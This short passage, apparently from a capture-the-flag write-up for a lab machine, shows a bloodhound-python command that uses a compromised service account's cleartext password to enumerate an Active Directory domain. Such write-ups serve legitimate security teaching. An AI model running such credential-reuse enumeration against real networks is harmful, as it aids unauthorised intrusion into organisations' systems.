Now that we compromised svc_ldap let's use the compromised account to enumerate the domain.

```sh
bloodhound-python -c all \
	-d authority.htb \
	-u 'svc_ldap@authority.htb' \
	-p 'lDaP_1n_th3_cle4r!' \
	-ns 10.129.229.56 \
	--zip
```

![](images/winrm.png)

